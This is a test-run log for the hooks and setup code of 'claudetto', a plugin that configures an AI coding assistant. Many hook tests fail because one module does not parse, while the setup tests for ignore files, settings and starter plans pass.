+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the built-in /statusline prompt is replaced, and a user's own skill keeps its text [15.21ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the /statusline edit text names settings.json under CLAUDE_CONFIG_DIR, else under HOME [18.59ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a typed Context7 key is written to settings env and the report does not repeat it [18.61ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a Context7 key already in settings env is the user's: not asked, not replaced [17.64ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a skipped Context7 key writes nothing [17.58ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(pass) the hooks runtime computes SHA-256 as the setup hash needs it [0.96ms]
+
+hooks/setup/ignore-block.test.ts:
+(pass) `applyBlock` > a CRLF file keeps one block on a rerun, in CRLF [1.68ms]
+(pass) `applyBlock` > a missing file becomes the block alone [0.24ms]
+(pass) `applyBlock` > a file with user lines gets the block after one blank line [0.18ms]
+(pass) `applyBlock` > a file that lacks a final newline still gets one blank line [0.18ms]
+(pass) `applyBlock` > a file that ends with a blank line gets no second one [0.14ms]
+(pass) `applyBlock` > a path the user already names is left out, with or without a slash [0.15ms]
+(pass) `applyBlock` > a negation counts as naming the path [0.14ms]
+(pass) `applyBlock` > a comment or a blank line names nothing [0.12ms]
+(pass) `applyBlock` > a rerun with the same lines is byte for byte the same [0.16ms]
+(pass) `applyBlock` > a rerun replaces the block and keeps the lines around it [0.11ms]
+(pass) `applyBlock` > a block that holds a path the user later names drops it [0.11ms]
+(pass) `applyBlock` > no lines and no block leaves the file as it is [0.13ms]
+(pass) `applyBlock` > a block with no closing marker is left as it is [0.11ms]
+(pass) `diffOf` > a new file shows every line as added [0.15ms]
+(pass) `diffOf` > an edit shows the removed and added lines only [0.11ms]
+(pass) `diffOf` > a removed line shows with a minus [0.10ms]
+(pass) `diffOf` > no change shows nothing [0.09ms]
+
+hooks/setup/ignore-plan.test.ts:
+(pass) the fixed template > a folder of no known family gets the fixed lines and an empty `.ignore` [2.05ms]
+(pass) each family > js: tracked heavy and bulky paths go to `.ignore` only [1.41ms]
+(pass) each family > js: heavy paths git does not track go to `.gitignore`, and absent bulky ones nowhere [1.00ms]
+(pass) each family > python: tracked heavy and bulky paths go to `.ignore` only [1.51ms]
+(pass) each family > python: heavy paths git does not track go to `.gitignore`, and absent bulky ones nowhere [0.69ms]
+(pass) each family > ruby: tracked heavy and bulky paths go to `.ignore` only [0.48ms]
+(pass) each family > ruby: heavy paths git does not track go to `.gitignore`, and absent bulky ones nowhere [0.27ms]
+(pass) each family > shell: tracked heavy and bulky paths go to `.ignore` only [0.19ms]
+(pass) each family > shell: heavy paths git does not track go to `.gitignore`, and absent bulky ones nowhere [0.18ms]
+(pass) each family > web: tracked heavy and bulky paths go to `.ignore` only [0.16ms]
+(pass) each family > web: heavy paths git does not track go to `.gitignore`, and absent bulky ones nowhere [0.15ms]
+(pass) each family > c: tracked heavy and bulky paths go to `.ignore` only [4.53ms]
+(pass) each family > c: heavy paths git does not track go to `.gitignore`, and absent bulky ones nowhere [0.80ms]
+(pass) each family > rust: tracked heavy and bulky paths go to `.ignore` only [1.51ms]
+(pass) each family > rust: heavy paths git does not track go to `.gitignore`, and absent bulky ones nowhere [0.24ms]
+(pass) each family > swift: tracked heavy and bulky paths go to `.ignore` only [1.14ms]
+(pass) each family > swift: heavy paths git does not track go to `.gitignore`, and absent bulky ones nowhere [0.28ms]
+(pass) each family > jvm: tracked heavy and bulky paths go to `.ignore` only [0.43ms]
+(pass) each family > jvm: heavy paths git does not track go to `.gitignore`, and absent bulky ones nowhere [0.34ms]
+(pass) each family > dotnet: tracked heavy and bulky paths go to `.ignore` only [0.26ms]
+(pass) each family > dotnet: heavy paths git does not track go to `.gitignore`, and absent bulky ones nowhere [0.22ms]
+(pass) each family > go: tracked heavy and bulky paths go to `.ignore` only [0.20ms]
+(pass) each family > go: heavy paths git does not track go to `.gitignore`, and absent bulky ones nowhere [0.18ms]
+(pass) a repo with two stacks > the paths of both land in the files, with a shared path once [0.27ms]
+(pass) a repo with two stacks > a lock file git sees but does not track still goes to `.ignore` [0.18ms]
+
+hooks/setup/ignores.test.ts:
+(pass) a repo with no ignore file > both files are made, each as its block [2.20ms]
+(pass) a repo with no ignore file > `.ignore` is not made when it would hold nothing [0.58ms]
+(pass) a repo with no ignore file > `.ignore` is made when git tracks a heavy path [0.32ms]
+(pass) a repo with no ignore file > `.rgignore` is never made [0.29ms]
+(pass) a repo with lines of its own > a path it names, a duplicate or a negation, stays out of the block [0.52ms]
+(pass) a repo with lines of its own > the lines outside the block are the lines it had [0.27ms]
+(pass) a rerun > on the file it wrote changes nothing [0.35ms]
+(pass) a rerun > after a family is added changes only the block [0.51ms]
+(pass) the dialog text > shows each file with its added lines [0.34ms]
+(pass) the dialog text > shows only the block lines that change on a rerun [0.35ms]
+(pass) `settle` > rebuilds the text from the file as it is when the user answers [0.37ms]
+
+hooks/setup/settings.test.ts:
+(pass) an empty file takes every group, and a second pass finds nothing to change [6.58ms]
+(pass) the eight tools of the tool-trim are denied [1.24ms]
+(pass) no built-in agent and no tool that ToolSearch or Skill need is denied [0.30ms]
+(pass) telemetry is off through DISABLE_TELEMETRY alone [0.48ms]
+(pass) a deny list keeps the user's rules and adds ours once [0.45ms]
+(pass) fill keeps a value the user set, and replace takes ours [0.19ms]
+(pass) other keys of the user's file stay as they are [0.41ms]
+(pass) a file that is not a JSON object is refused and a missing file is empty [0.25ms]
+(pass) the auto-mode lists replace the built-ins, so none names $defaults [0.32ms]
+(pass) eleven built-in plugins are off as cc-plugin-<name>@builtin [0.93ms]
+(pass) auto mode writes no classifyAllShell [0.36ms]
+(pass) the models are the three of this release and nothing else [0.26ms]
+(pass) the bundled-skill switch and the compaction keys are written [0.39ms]
+(pass) the status line refreshes every 5 seconds, and fill keeps the user's own [0.19ms]
+(pass) a login of {"organizationType":"claude_pro"} caps subagents at 3 [0.14ms]
+(pass) a login of {"organizationRateLimitTier":"default_claude_max_5x"} caps subagents at 4 [0.08ms]
+(pass) a login of {"organizationRateLimitTier":"default_claude_max_20x"} caps subagents at nothing [0.07ms]
+(pass) a login of {} caps subagents at nothing [0.07ms]
+(pass) no login record writes no cap [0.09ms]
+(pass) the groups are labelled and explained in order [0.26ms]
+(pass) the status line is a command [0.14ms]
+(pass) the smaller prompt allows read-only git, denies the trimmed tools, and picks the Concise style [0.17ms]
+(pass) the auto-mode group writes the autoMode lists [0.13ms]
+(pass) the models group writes the models, ceilings, and windows [0.16ms]
+(pass) the features-off group writes every switch and environment variable [0.19ms]
+(pass) the sandbox group turns the sandbox on, closes the retry, and opens no domain list [0.17ms]
+(pass) a sandbox list the user holds stays under fill [0.14ms]
+(pass) a null value in the user's file is replaced, not walked into [0.17ms]
+(pass) only a permission list merges; another list is replaced [0.15ms]
+(pass) a deny list gains our rules after the user's, and fill adds the rules a list lacks [0.20ms]
+(pass) a plan is found in either tier field, and only by a string name [0.13ms]
+(pass) the cap group is labelled and names the cap and the plan [0.11ms]
+(pass) the sandbox's denyRead leaves the signing keys readable [0.44ms]
+
+hooks/setup/starter.test.ts:
+(pass) detectFamilies > a root marker names its family [1.88ms]
+(pass) detectFamilies > a marker below the root does not count [0.31ms]
+(pass) detectFamilies > a glob marker matches a root name [0.26ms]
+(pass) detectFamilies > a repo with two stacks names both, in table order [0.24ms]
+(pass) planStarter > a bun repo gets bounded commands from its markers [0.49ms]
+(pass) planStarter > CLAUDE.md is a title, a blank line, and the import [0.27ms]
+(pass) planStarter > an existing AGENTS.md or CLAUDE.md plans nothing [0.16ms]
+(pass) planStarter > an unknown repo plans nothing [0.19ms]
+(pass) planStarter > all families together stay under the cap by dropping later ones [0.39ms]
+(pass) planStarter > each family alone fits the cap with every command on [1.70ms]
+(pass) table > covers the eleven families [0.47ms]
+(pass) unsourced table entries > no family lists an entry that no source names [0.31ms]
+(pass) linesOf and previewOf > linesOf drops blank lines [0.13ms]
+(pass) linesOf and previewOf > previewOf marks each new line with a plus [0.16ms]
+
+hooks/setup/tools.test.ts:
+(pass) a name in any PATH folder is found, and a name in none is not [2.17ms]
+(pass) the notice names brew's command when brew exists and the releases page otherwise [0.39ms]
+(pass) a release below the floor is below, an equal or later one and a prerelease of the floor are not [0.38ms]
+
+hooks/slices.test.ts:
+(fail) a stop with an edited file git reports changed is blocked, and the block names it [64.16ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a committed edit passes [40.79ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a stop with no write runs no git and passes [43.98ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) when the permission chain denies a commit, the stop passes [41.07ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a stop the hook already continued passes [25.04ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a no-commit constraint from the user, through the ledger, lets the stop pass [30.83ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+
+hooks/surface.test.ts:
+(fail) the root prompt is one shared section within 5,218 bytes [42.98ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(pass) the /init interview fits 1,144 chars, names the claudetto ask-user-question tool, and no deleted file [0.67ms]
+(pass) the ListAgents text is 304 chars [0.18ms]
+(fail) tool.describe sends our Bash text, deferred only for Read, Write, Skill among them [41.37ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) tool.describe sends our Read text, deferred only for Read, Write, Skill among them [25.94ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) tool.describe sends our Edit text, deferred only for Read, Write, Skill among them [37.69ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) tool.describe sends our Write text, deferred only for Read, Write, Skill among them [23.27ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) tool.describe sends our Skill text, deferred only for Read, Write, Skill among them [24.41ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) tool.describe sends our EnterWorktree text, deferred only for Read, Write, Skill among them [20.94ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) tool.describe sends our ExitWorktree text, deferred only for Read, Write, Skill among them [25.07ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) tool.describe sends our SendMessage text, deferred only for Read, Write, Skill among them [20.17ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) tool.describe sends our TaskStop text, deferred only for Read, Write, Skill among them [17.36ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) tool.describe sends our WebFetch text, deferred only for Read, Write, Skill among them [18.60ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) tool.describe sends our WebSearch text, deferred only for Read, Write, Skill among them [16.66ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) tool.describe sends our NotebookEdit text, deferred only for Read, Write, Skill among them [16.54ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) tool.describe sends our ListAgents text, deferred only for Read, Write, Skill among them [18.83ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) Workflow goes behind ToolSearch with its stock text [17.04ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) ScheduleWakeup goes behind ToolSearch with its stock text [20.50ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) ReportFindings goes behind ToolSearch with its stock text [15.74ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a stock description shorter than ours is kept [15.39ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /add-dir is off and hidden [20.68ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /agents is off and hidden [16.39ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /autocompact is off and hidden [17.68ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /background is off and hidden [15.39ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /branch is off and hidden [14.95ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /bug is off and hidden [14.84ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /cd is off and hidden [20.59ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /compact is off and hidden [16.59ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /fast is off and hidden [19.74ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /feedback is off and hidden [24.32ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /focus is off and hidden [21.14ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /ide is off and hidden [22.73ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /memory is off and hidden [21.20ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /mobile is off and hidden [19.63ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /passes is off and hidden [23.40ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /plan is off and hidden [13.80ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /powerup is off and hidden [19.05ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /pro-trial-expired is off and hidden [19.49ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /radio is off and hidden [22.08ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /recap is off and hidden [19.17ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /release-notes is off and hidden [19.53ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /setup-bedrock is off and hidden [20.01ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /setup-vertex is off and hidden [19.73ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /stickers is off and hidden [23.61ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /workflows is off and hidden [19.40ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /__remote-workflow is off and hidden [23.07ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /workflow-launch-exec is off and hidden [16.56ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a whole Read of a lock file is denied, a Read with a limit goes on [21.28ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a whole Read of /r/Cargo.lock is denied [25.28ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a whole Read of /r/app.min.js is denied [20.04ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a whole Read of /r/a.js.map is denied [21.46ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a whole Read of /r/node_modules/x/index.js is denied [17.87ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(pass) Rule K: the 18 prompt commands go off, but not a name a user skill holds [0.70ms]
+(fail) the full plan mode reminder is replaced by a shorter one naming the plan file [21.89ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a plan file that already holds a plan is read before it is edited [14.22ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the sparse reminder is kept [17.84ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) an engine plan mode text shorter than ours is kept [16.47ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a plan mode row without its facts is kept [22.89ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) another attachment is passed on unchanged [17.47ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the built-in init skill reaches the model as the interview [14.56ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a user's own skill named init keeps its text [24.01ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) another built-in skill keeps its text [16.90ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a Read of a source file goes on [14.42ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) with readGuardEnabled off, a whole Read of a lock file goes on [21.11ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(pass) the root prompt opens on its role and holds no agent frontmatter [0.29ms]
+(fail) a tool claudetto writes no text for is passed on unchanged [16.40ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) two builds of a tool text are byte-identical [13.57ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a folder with package.json and bun.lock adds the bun text, again after clear and compact [16.44ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a folder with only package.json adds nothing [16.26ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a folder with only bun.lock adds nothing [19.72ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) with bunRuleEnabled off, nothing is added [14.33ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+
+ 728 pass
+ 443 fail
+Ran 1171 tests across 35 files. [52.32s]
